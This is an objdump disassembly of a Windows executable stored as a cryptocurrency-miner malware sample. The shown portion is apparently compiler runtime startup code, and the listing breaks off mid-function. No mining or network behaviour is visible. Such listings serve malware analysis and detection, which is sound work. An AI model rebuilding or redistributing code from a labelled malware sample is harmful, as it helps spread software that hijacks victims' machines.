
malware_samples/miner/0f29ca61f2667c5a6e3f73ea6ba4672aacffa90caded20a2aa86ad9fa191d8e0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	33 d2                	xor    %edx,%edx
   140001002:	48 ff 25 37 d2 00 00 	rex.W jmp *0xd237(%rip)        # 0x14000e240
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	40 53                	rex push %rbx
   14000100e:	48 83 ec 20          	sub    $0x20,%rsp
   140001012:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001017:	e8 80 34 00 00       	call   0x14000449c
   14000101c:	e8 4f 05 00 00       	call   0x140001570
   140001021:	8b c8                	mov    %eax,%ecx
   140001023:	e8 e0 3e 00 00       	call   0x140004f08
   140001028:	e8 37 05 00 00       	call   0x140001564
   14000102d:	8b d8                	mov    %eax,%ebx
   14000102f:	e8 60 40 00 00       	call   0x140005094
   140001034:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001039:	89 18                	mov    %ebx,(%rax)
   14000103b:	e8 b0 02 00 00       	call   0x1400012f0
   140001040:	84 c0                	test   %al,%al
   140001042:	74 73                	je     0x1400010b7
   140001044:	e8 e3 07 00 00       	call   0x14000182c
   140001049:	48 8d 0d 18 08 00 00 	lea    0x818(%rip),%rcx        # 0x140001868
   140001050:	e8 4b 04 00 00       	call   0x1400014a0
   140001055:	e8 0e 05 00 00       	call   0x140001568
   14000105a:	8b c8                	mov    %eax,%ecx
   14000105c:	e8 cf 36 00 00       	call   0x140004730
   140001061:	85 c0                	test   %eax,%eax
   140001063:	75 52                	jne    0x1400010b7
   140001065:	e8 0e 05 00 00       	call   0x140001578
   14000106a:	e8 4d 05 00 00       	call   0x1400015bc
   14000106f:	85 c0                	test   %eax,%eax
   140001071:	74 0c                	je     0x14000107f
   140001073:	48 8d 0d ea 04 00 00 	lea    0x4ea(%rip),%rcx        # 0x140001564
   14000107a:	e8 85 34 00 00       	call   0x140004504
   14000107f:	e8 08 05 00 00       	call   0x14000158c
   140001084:	e8 03 05 00 00       	call   0x14000158c
   140001089:	e8 d6 04 00 00       	call   0x140001564
   14000108e:	8b c8                	mov    %eax,%ecx
   140001090:	e8 5f 3f 00 00       	call   0x140004ff4
   140001095:	e8 ee 04 00 00       	call   0x140001588
   14000109a:	84 c0                	test   %al,%al
   14000109c:	74 05                	je     0x1400010a3
   14000109e:	e8 5d 3a 00 00       	call   0x140004b00
   1400010a3:	e8 bc 04 00 00       	call   0x140001564
   1400010a8:	e8 b7 06 00 00       	call   0x140001764
   1400010ad:	85 c0                	test   %eax,%eax
   1400010af:	75 06                	jne    0x1400010b7
   1400010b1:	48 83 c4 20          	add    $0x20,%rsp
   1400010b5:	5b                   	pop    %rbx
   1400010b6:	c3                   	ret
   1400010b7:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400010bc:	e8 1f 05 00 00       	call   0x1400015e0
   1400010c1:	cc                   	int3
   1400010c2:	cc                   	int3
   1400010c3:	cc                   	int3
   1400010c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400010c8:	e8 d3 04 00 00       	call   0x1400015a0
   1400010cd:	33 c0                	xor    %eax,%eax
   1400010cf:	48 83 c4 28          	add    $0x28,%rsp
   1400010d3:	c3                   	ret
   1400010d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400010d8:	e8 e3 06 00 00       	call   0x1400017c0
   1400010dd:	e8 82 04 00 00       	call   0x140001564
   1400010e2:	8b c8                	mov    %eax,%ecx
   1400010e4:	48 83 c4 28          	add    $0x28,%rsp
   1400010e8:	e9 7b 3f 00 00       	jmp    0x140005068
   1400010ed:	cc                   	int3
   1400010ee:	cc                   	int3
   1400010ef:	cc                   	int3
   1400010f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010f5:	57                   	push   %rdi
   1400010f6:	48 83 ec 30          	sub    $0x30,%rsp
   1400010fa:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010ff:	e8 b0 01 00 00       	call   0x1400012b4
   140001104:	84 c0                	test   %al,%al
   140001106:	0f 84 30 01 00 00    	je     0x14000123c
   14000110c:	40 32 ff             	xor    %dil,%dil
   14000110f:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001114:	e8 5f 01 00 00       	call   0x140001278
   140001119:	8a d8                	mov    %al,%bl
   14000111b:	8b 0d b7 79 01 00    	mov    0x179b7(%rip),%ecx        # 0x140018ad8
   140001121:	83 f9 01             	cmp    $0x1,%ecx
   140001124:	0f 84 1d 01 00 00    	je     0x140001247
   14000112a:	85 c9                	test   %ecx,%ecx
   14000112c:	75 4a                	jne    0x140001178
   14000112e:	c7 05 a0 79 01 00 01 	movl   $0x1,0x179a0(%rip)        # 0x140018ad8
   140001135:	00 00 00 
   140001138:	48 8d 15 99 d1 00 00 	lea    0xd199(%rip),%rdx        # 0x14000e2d8
   14000113f:	48 8d 0d 5a d1 00 00 	lea    0xd15a(%rip),%rcx        # 0x14000e2a0
   140001146:	e8 55 3a 00 00       	call   0x140004ba0
   14000114b:	85 c0                	test   %eax,%eax
   14000114d:	74 0a                	je     0x140001159
   14000114f:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001154:	e9 d8 00 00 00       	jmp    0x140001231
   140001159:	48 8d 15 38 d1 00 00 	lea    0xd138(%rip),%rdx        # 0x14000e298
   140001160:	48 8d 0d 21 d1 00 00 	lea    0xd121(%rip),%rcx        # 0x14000e288
   140001167:	e8 f0 39 00 00       	call   0x140004b5c
   14000116c:	c7 05 62 79 01 00 02 	movl   $0x2,0x17962(%rip)        # 0x140018ad8
   140001173:	00 00 00 
   140001176:	eb 08                	jmp    0x140001180
   140001178:	40 b7 01             	mov    $0x1,%dil
   14000117b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001180:	8a cb                	mov    %bl,%cl
   140001182:	e8 8d 02 00 00       	call   0x140001414
   140001187:	e8 3c 04 00 00       	call   0x1400015c8
   14000118c:	48 8b d8             	mov    %rax,%rbx
   14000118f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001193:	74 1e                	je     0x1400011b3
   140001195:	48 8b c8             	mov    %rax,%rcx
   140001198:	e8 df 01 00 00       	call   0x14000137c
   14000119d:	84 c0                	test   %al,%al
   14000119f:	74 12                	je     0x1400011b3
   1400011a1:	45 33 c0             	xor    %r8d,%r8d
   1400011a4:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400011a8:	33 c9                	xor    %ecx,%ecx
   1400011aa:	48 8b 03             	mov    (%rbx),%rax
   1400011ad:	ff 15 ad d0 00 00    	call   *0xd0ad(%rip)        # 0x14000e260
   1400011b3:	e8 18 04 00 00       	call   0x1400015d0
   1400011b8:	48 8b d8             	mov    %rax,%rbx
   1400011bb:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400011bf:	74 14                	je     0x1400011d5
   1400011c1:	48 8b c8             	mov    %rax,%rcx
   1400011c4:	e8 b3 01 00 00       	call   0x14000137c
   1400011c9:	84 c0                	test   %al,%al
   1400011cb:	74 08                	je     0x1400011d5
   1400011cd:	48 8b 0b             	mov    (%rbx),%rcx
   1400011d0:	e8 e7 3c 00 00       	call   0x140004ebc
   1400011d5:	e8 4e 05 00 00       	call   0x140001728
   1400011da:	0f b7 d8             	movzwl %ax,%ebx
   1400011dd:	e8 26 39 00 00       	call   0x140004b08
   1400011e2:	44 8b cb             	mov    %ebx,%r9d
   1400011e5:	4c 8b c0             	mov    %rax,%r8
   1400011e8:	33 d2                	xor    %edx,%edx
   1400011ea:	48 8d 0d 0f ee ff ff 	lea    -0x11f1(%rip),%rcx        # 0x140000000
   1400011f1:	e8 0a fe ff ff       	call   0x140001000
   1400011f6:	8b d8                	mov    %eax,%ebx
   1400011f8:	e8 6f 05 00 00       	call   0x14000176c
   1400011fd:	84 c0                	test   %al,%al
   1400011ff:	74 50                	je     0x140001251
   140001201:	40 84 ff             	test   %dil,%dil
   140001204:	75 05                	jne    0x14000120b
   140001206:	e8 95 3c 00 00       	call   0x140004ea0
   14000120b:	33 d2                	xor    %edx,%edx
   14000120d:	b1 01                	mov    $0x1,%cl
   14000120f:	e8 24 02 00 00       	call   0x140001438
   140001214:	8b c3                	mov    %ebx,%eax
   140001216:	eb 19                	jmp    0x140001231
   140001218:	8b d8                	mov    %eax,%ebx
   14000121a:	e8 4d 05 00 00       	call   0x14000176c
   14000121f:	84 c0                	test   %al,%al
   140001221:	74 36                	je     0x140001259
   140001223:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001228:	75 05                	jne    0x14000122f
   14000122a:	e8 61 3c 00 00       	call   0x140004e90
   14000122f:	8b c3                	mov    %ebx,%eax
   140001231:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001236:	48 83 c4 30          	add    $0x30,%rsp
   14000123a:	5f                   	pop    %rdi
   14000123b:	c3                   	ret
   14000123c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001241:	e8 9a 03 00 00       	call   0x1400015e0
   140001246:	90                   	nop
   140001247:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000124c:	e8 8f 03 00 00       	call   0x1400015e0
   140001251:	8b cb                	mov    %ebx,%ecx
   140001253:	e8 a4 3c 00 00       	call   0x140004efc
   140001258:	90                   	nop
   140001259:	8b cb                	mov    %ebx,%ecx
   14000125b:	e8 50 3c 00 00       	call   0x140004eb0
   140001260:	90                   	nop
   140001261:	cc                   	int3
   140001262:	cc                   	int3
   140001263:	cc                   	int3
   140001264:	48 83 ec 28          	sub    $0x28,%rsp
   140001268:	e8 4b 02 00 00       	call   0x1400014b8
   14000126d:	48 83 c4 28          	add    $0x28,%rsp
   140001271:	e9 7a fe ff ff       	jmp    0x1400010f0
   140001276:	cc                   	int3
   140001277:	cc                   	int3
   140001278:	48 83 ec 28          	sub    $0x28,%rsp
   14000127c:	e8 ef 08 00 00       	call   0x140001b70
   140001281:	85 c0                	test   %eax,%eax
   140001283:	74 21                	je     0x1400012a6
   140001285:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   14000128c:	00 00 
   14000128e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001292:	eb 05                	jmp    0x140001299
   140001294:	48 3b c8             	cmp    %rax,%rcx
   140001297:	74 14                	je     0x1400012ad
   140001299:	33 c0                	xor    %eax,%eax
   14000129b:	f0 48 0f b1 0d 3c 78 	lock cmpxchg %rcx,0x1783c(%rip)        # 0x140018ae0
   1400012a2:	01 00 
   1400012a4:	75 ee                	jne    0x140001294
   1400012a6:	32 c0                	xor    %al,%al
   1400012a8:	48 83 c4 28          	add    $0x28,%rsp
   1400012ac:	c3                   	ret
   1400012ad:	b0 01                	mov    $0x1,%al
   1400012af:	eb f7                	jmp    0x1400012a8
   1400012b1:	cc                   	int3
   1400012b2:	cc                   	int3
   1400012b3:	cc                   	int3
   1400012b4:	48 83 ec 28          	sub    $0x28,%rsp
   1400012b8:	85 c9                	test   %ecx,%ecx
   1400012ba:	75 07                	jne    0x1400012c3
   1400012bc:	c6 05 25 78 01 00 01 	movb   $0x1,0x17825(%rip)        # 0x140018ae8
   1400012c3:	e8 dc 05 00 00       	call   0x1400018a4
   1400012c8:	e8 cb 0a 00 00       	call   0x140001d98
   1400012cd:	84 c0                	test   %al,%al
   1400012cf:	75 04                	jne    0x1400012d5
   1400012d1:	32 c0                	xor    %al,%al
   1400012d3:	eb 14                	jmp    0x1400012e9
   1400012d5:	e8 fa 42 00 00       	call   0x1400055d4
   1400012da:	84 c0                	test   %al,%al
   1400012dc:	75 09                	jne    0x1400012e7
   1400012de:	33 c9                	xor    %ecx,%ecx
   1400012e0:	e8 db 0a 00 00       	call   0x140001dc0
   1400012e5:	eb ea                	jmp    0x1400012d1
   1400012e7:	b0 01                	mov    $0x1,%al
   1400012e9:	48 83 c4 28          	add    $0x28,%rsp
   1400012ed:	c3                   	ret
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	80 3d ec 77 01 00 00 	cmpb   $0x0,0x177ec(%rip)        # 0x140018ae9
   1400012fd:	8b d9                	mov    %ecx,%ebx
   1400012ff:	75 67                	jne    0x140001368
   140001301:	83 f9 01             	cmp    $0x1,%ecx
   140001304:	77 6a                	ja     0x140001370
   140001306:	e8 65 08 00 00       	call   0x140001b70
   14000130b:	85 c0                	test   %eax,%eax
   14000130d:	74 28                	je     0x140001337
   14000130f:	85 db                	test   %ebx,%ebx
   140001311:	75 24                	jne    0x140001337
   140001313:	48 8d 0d d6 77 01 00 	lea    0x177d6(%rip),%rcx        # 0x140018af0
   14000131a:	e8 19 41 00 00       	call   0x140005438
   14000131f:	85 c0                	test   %eax,%eax
   140001321:	75 10                	jne    0x140001333
   140001323:	48 8d 0d de 77 01 00 	lea    0x177de(%rip),%rcx        # 0x140018b08
   14000132a:	e8 09 41 00 00       	call   0x140005438
   14000132f:	85 c0                	test   %eax,%eax
   140001331:	74 2e                	je     0x140001361
   140001333:	32 c0                	xor    %al,%al
   140001335:	eb 33                	jmp    0x14000136a
   140001337:	66 0f 6f 05 01 d0 00 	movdqa 0xd001(%rip),%xmm0        # 0x14000e340
   14000133e:	00 
   14000133f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001343:	f3 0f 7f 05 a5 77 01 	movdqu %xmm0,0x177a5(%rip)        # 0x140018af0
   14000134a:	00 
   14000134b:	48 89 05 ae 77 01 00 	mov    %rax,0x177ae(%rip)        # 0x140018b00
   140001352:	f3 0f 7f 05 ae 77 01 	movdqu %xmm0,0x177ae(%rip)        # 0x140018b08
   140001359:	00 
   14000135a:	48 89 05 b7 77 01 00 	mov    %rax,0x177b7(%rip)        # 0x140018b18
   140001361:	c6 05 81 77 01 00 01 	movb   $0x1,0x17781(%rip)        # 0x140018ae9
   140001368:	b0 01                	mov    $0x1,%al
   14000136a:	48 83 c4 20          	add    $0x20,%rsp
   14000136e:	5b                   	pop    %rbx
   14000136f:	c3                   	ret
   140001370:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001375:	e8 66 02 00 00       	call   0x1400015e0
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	48 83 ec 18          	sub    $0x18,%rsp
   140001380:	4c 8b c1             	mov    %rcx,%r8
   140001383:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001388:	66 39 05 71 ec ff ff 	cmp    %ax,-0x138f(%rip)        # 0x140000000
   14000138f:	75 78                	jne    0x140001409
   140001391:	48 63 0d a4 ec ff ff 	movslq -0x135c(%rip),%rcx        # 0x14000003c
   140001398:	48 8d 15 61 ec ff ff 	lea    -0x139f(%rip),%rdx        # 0x140000000
   14000139f:	48 03 ca             	add    %rdx,%rcx
   1400013a2:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400013a8:	75 5f                	jne    0x140001409
   1400013aa:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400013af:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400013b3:	75 54                	jne    0x140001409
   1400013b5:	4c 2b c2             	sub    %rdx,%r8
   1400013b8:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400013bc:	48 83 c2 18          	add    $0x18,%rdx
   1400013c0:	48 03 d1             	add    %rcx,%rdx
   1400013c3:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400013c7:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400013cb:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400013cf:	48 89 14 24          	mov    %rdx,(%rsp)
   1400013d3:	49 3b d1             	cmp    %r9,%rdx
   1400013d6:	74 18                	je     0x1400013f0
   1400013d8:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400013db:	4c 3b c1             	cmp    %rcx,%r8
   1400013de:	72 0a                	jb     0x1400013ea
   1400013e0:	8b 42 08             	mov    0x8(%rdx),%eax
   1400013e3:	03 c1                	add    %ecx,%eax
   1400013e5:	4c 3b c0             	cmp    %rax,%r8
   1400013e8:	72 08                	jb     0x1400013f2
   1400013ea:	48 83 c2 28          	add    $0x28,%rdx
   1400013ee:	eb df                	jmp    0x1400013cf
   1400013f0:	33 d2                	xor    %edx,%edx
   1400013f2:	48 85 d2             	test   %rdx,%rdx
   1400013f5:	75 04                	jne    0x1400013fb
   1400013f7:	32 c0                	xor    %al,%al
   1400013f9:	eb 14                	jmp    0x14000140f
   1400013fb:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400013ff:	7d 04                	jge    0x140001405
   140001401:	32 c0                	xor    %al,%al
   140001403:	eb 0a                	jmp    0x14000140f
   140001405:	b0 01                	mov    $0x1,%al
   140001407:	eb 06                	jmp    0x14000140f
   140001409:	32 c0                	xor    %al,%al
   14000140b:	eb 02                	jmp    0x14000140f
   14000140d:	32 c0                	xor    %al,%al
   14000140f:	48 83 c4 18          	add    $0x18,%rsp
   140001413:	c3                   	ret
   140001414:	40 53                	rex push %rbx
   140001416:	48 83 ec 20          	sub    $0x20,%rsp
   14000141a:	8a d9                	mov    %cl,%bl
   14000141c:	e8 4f 07 00 00       	call   0x140001b70
   140001421:	33 d2                	xor    %edx,%edx
   140001423:	85 c0                	test   %eax,%eax
   140001425:	74 0b                	je     0x140001432
   140001427:	84 db                	test   %bl,%bl
   140001429:	75 07                	jne    0x140001432
   14000142b:	48 87 15 ae 76 01 00 	xchg   %rdx,0x176ae(%rip)        # 0x140018ae0
   140001432:	48 83 c4 20          	add    $0x20,%rsp
   140001436:	5b                   	pop    %rbx
   140001437:	c3                   	ret
   140001438:	40 53                	rex push %rbx
   14000143a:	48 83 ec 20          	sub    $0x20,%rsp
   14000143e:	80 3d a3 76 01 00 00 	cmpb   $0x0,0x176a3(%rip)        # 0x140018ae8
   140001445:	8a d9                	mov    %cl,%bl
   140001447:	74 04                	je     0x14000144d
   140001449:	84 d2                	test   %dl,%dl
   14000144b:	75 0c                	jne    0x140001459
   14000144d:	e8 96 41 00 00       	call   0x1400055e8
   140001452:	8a cb                	mov    %bl,%cl
   140001454:	e8 67 09 00 00       	call   0x140001dc0
   140001459:	b0 01                	mov    $0x1,%al
   14000145b:	48 83 c4 20          	add    $0x20,%rsp
   14000145f:	5b                   	pop    %rbx
   140001460:	c3                   	ret
   140001461:	cc                   	int3
   140001462:	cc                   	int3
   140001463:	cc                   	int3
   140001464:	40 53                	rex push %rbx
   140001466:	48 83 ec 20          	sub    $0x20,%rsp
   14000146a:	48 83 3d 7e 76 01 00 	cmpq   $0xffffffffffffffff,0x1767e(%rip)        # 0x140018af0
   140001471:	ff 
   140001472:	48 8b d9             	mov    %rcx,%rbx
   140001475:	75 07                	jne    0x14000147e
   140001477:	e8 68 3f 00 00       	call   0x1400053e4
   14000147c:	eb 0f                	jmp    0x14000148d
   14000147e:	48 8b d3             	mov    %rbx,%rdx
   140001481:	48 8d 0d 68 76 01 00 	lea    0x17668(%rip),%rcx        # 0x140018af0
   140001488:	e8 d3 3f 00 00       	call   0x140005460
   14000148d:	33 d2                	xor    %edx,%edx
   14000148f:	85 c0                	test   %eax,%eax
   140001491:	48 0f 44 d3          	cmove  %rbx,%rdx
   140001495:	48 8b c2             	mov    %rdx,%rax
   140001498:	48 83 c4 20          	add    $0x20,%rsp
   14000149c:	5b                   	pop    %rbx
   14000149d:	c3                   	ret
   14000149e:	cc                   	int3
   14000149f:	cc                   	int3
   1400014a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400014a4:	e8 bb ff ff ff       	call   0x140001464
   1400014a9:	48 f7 d8             	neg    %rax
   1400014ac:	1b c0                	sbb    %eax,%eax
   1400014ae:	f7 d8                	neg    %eax
   1400014b0:	ff c8                	dec    %eax
   1400014b2:	48 83 c4 28          	add    $0x28,%rsp
   1400014b6:	c3                   	ret
   1400014b7:	cc                   	int3
   1400014b8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400014bd:	55                   	push   %rbp
   1400014be:	48 8b ec             	mov    %rsp,%rbp
   1400014c1:	48 83 ec 30          	sub    $0x30,%rsp
   1400014c5:	48 8b 05 74 6b 01 00 	mov    0x16b74(%rip),%rax        # 0x140018040
   1400014cc:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400014d3:	2b 00 00 
   1400014d6:	48 3b c3             	cmp    %rbx,%rax
   1400014d9:	75 74                	jne    0x14000154f
   1400014db:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   1400014e0:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400014e4:	ff 15 3e cb 00 00    	call   *0xcb3e(%rip)        # 0x14000e028
   1400014ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400014ee:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400014f2:	ff 15 28 cb 00 00    	call   *0xcb28(%rip)        # 0x14000e020
   1400014f8:	8b c0                	mov    %eax,%eax
   1400014fa:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400014fe:	ff 15 14 cb 00 00    	call   *0xcb14(%rip)        # 0x14000e018
   140001504:	8b c0                	mov    %eax,%eax
   140001506:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000150a:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   14000150e:	ff 15 fc ca 00 00    	call   *0xcafc(%rip)        # 0x14000e010
   140001514:	8b 45 18             	mov    0x18(%rbp),%eax
   140001517:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000151b:	48 c1 e0 20          	shl    $0x20,%rax
   14000151f:	48 33 45 18          	xor    0x18(%rbp),%rax
   140001523:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140001527:	48 33 c1             	xor    %rcx,%rax
   14000152a:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140001531:	ff 00 00 
   140001534:	48 23 c1             	and    %rcx,%rax
   140001537:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   14000153e:	2b 00 00 
   140001541:	48 3b c3             	cmp    %rbx,%rax
   140001544:	48 0f 44 c1          	cmove  %rcx,%rax
   140001548:	48 89 05 f1 6a 01 00 	mov    %rax,0x16af1(%rip)        # 0x140018040
   14000154f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140001554:	48 f7 d0             	not    %rax
   140001557:	48 89 05 22 6b 01 00 	mov    %rax,0x16b22(%rip)        # 0x140018080
   14000155e:	48 83 c4 30          	add    $0x30,%rsp
   140001562:	5d                   	pop    %rbp
   140001563:	c3                   	ret
   140001564:	33 c0                	xor    %eax,%eax
   140001566:	c3                   	ret
   140001567:	cc                   	int3
   140001568:	b8 01 00 00 00       	mov    $0x1,%eax
   14000156d:	c3                   	ret
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	b8 00 40 00 00       	mov    $0x4000,%eax
   140001575:	c3                   	ret
   140001576:	cc                   	int3
   140001577:	cc                   	int3
   140001578:	48 8d 0d a1 75 01 00 	lea    0x175a1(%rip),%rcx        # 0x140018b20
   14000157f:	48 ff 25 aa ca 00 00 	rex.W jmp *0xcaaa(%rip)        # 0x14000e030
   140001586:	cc                   	int3
   140001587:	cc                   	int3
   140001588:	b0 01                	mov    $0x1,%al
   14000158a:	c3                   	ret
   14000158b:	cc                   	int3
   14000158c:	c2 00 00             	ret    $0x0
   14000158f:	cc                   	int3
   140001590:	48 8d 05 99 75 01 00 	lea    0x17599(%rip),%rax        # 0x140018b30
   140001597:	c3                   	ret
   140001598:	48 8d 05 99 75 01 00 	lea    0x17599(%rip),%rax        # 0x140018b38
   14000159f:	c3                   	ret
   1400015a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015a4:	e8 e7 ff ff ff       	call   0x140001590
   1400015a9:	48 83 08 24          	orq    $0x24,(%rax)
   1400015ad:	e8 e6 ff ff ff       	call   0x140001598
   1400015b2:	48 83 08 02          	orq    $0x2,(%rax)
   1400015b6:	48 83 c4 28          	add    $0x28,%rsp
   1400015ba:	c3                   	ret
   1400015bb:	cc                   	int3
   1400015bc:	33 c0                	xor    %eax,%eax
   1400015be:	39 05 50 6a 01 00    	cmp    %eax,0x16a50(%rip)        # 0x140018014
   1400015c4:	0f 94 c0             	sete   %al
   1400015c7:	c3                   	ret
   1400015c8:	48 8d 05 b1 87 01 00 	lea    0x187b1(%rip),%rax        # 0x140019d80
   1400015cf:	c3                   	ret
   1400015d0:	48 8d 05 a1 87 01 00 	lea    0x187a1(%rip),%rax        # 0x140019d78
   1400015d7:	c3                   	ret
   1400015d8:	83 25 61 75 01 00 00 	andl   $0x0,0x17561(%rip)        # 0x140018b40
   1400015df:	c3                   	ret
   1400015e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400015e5:	55                   	push   %rbp
   1400015e6:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400015ed:	ff 
   1400015ee:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400015f5:	8b d9                	mov    %ecx,%ebx
   1400015f7:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400015fc:	ff 15 6e ca 00 00    	call   *0xca6e(%rip)        # 0x14000e070
   140001602:	85 c0                	test   %eax,%eax
   140001604:	74 04                	je     0x14000160a
   140001606:	8b cb                	mov    %ebx,%ecx
   140001608:	cd 29                	int    $0x29
   14000160a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000160f:	e8 c4 ff ff ff       	call   0x1400015d8
   140001614:	33 d2                	xor    %edx,%edx
   140001616:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000161a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140001620:	e8 0b b9 00 00       	call   0x14000cf30
   140001625:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001629:	ff 15 09 ca 00 00    	call   *0xca09(%rip)        # 0x14000e038
   14000162f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140001636:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   14000163d:	48 8b cb             	mov    %rbx,%rcx
   140001640:	45 33 c0             	xor    %r8d,%r8d
   140001643:	ff 15 f7 c9 00 00    	call   *0xc9f7(%rip)        # 0x14000e040
   140001649:	48 85 c0             	test   %rax,%rax
   14000164c:	74 3c                	je     0x14000168a
   14000164e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001654:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   14000165b:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140001662:	4c 8b c8             	mov    %rax,%r9
   140001665:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000166a:	4c 8b c3             	mov    %rbx,%r8
   14000166d:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140001674:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001679:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000167d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001682:	33 c9                	xor    %ecx,%ecx
   140001684:	ff 15 be c9 00 00    	call   *0xc9be(%rip)        # 0x14000e048
   14000168a:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140001691:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001696:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000169d:	33 d2                	xor    %edx,%edx
   14000169f:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400016a6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400016ac:	48 83 c0 08          	add    $0x8,%rax
   1400016b0:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400016b7:	e8 74 b8 00 00       	call   0x14000cf30
   1400016bc:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400016c3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400016c8:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400016cf:	40 
   1400016d0:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400016d7:	00 
   1400016d8:	ff 15 72 c9 00 00    	call   *0xc972(%rip)        # 0x14000e050
   1400016de:	8b d8                	mov    %eax,%ebx
   1400016e0:	33 c9                	xor    %ecx,%ecx
   1400016e2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400016e7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400016ec:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400016f0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400016f5:	ff 15 65 c9 00 00    	call   *0xc965(%rip)        # 0x14000e060
   1400016fb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001700:	ff 15 52 c9 00 00    	call   *0xc952(%rip)        # 0x14000e058
   140001706:	85 c0                	test   %eax,%eax
   140001708:	75 0d                	jne    0x140001717
   14000170a:	83 fb 01             	cmp    $0x1,%ebx
   14000170d:	74 08                	je     0x140001717
   14000170f:	8d 48 03             	lea    0x3(%rax),%ecx
   140001712:	e8 c1 fe ff ff       	call   0x1400015d8
   140001717:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000171e:	00 
   14000171f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140001726:	5d                   	pop    %rbp
   140001727:	c3                   	ret
   140001728:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000172f:	33 d2                	xor    %edx,%edx
   140001731:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
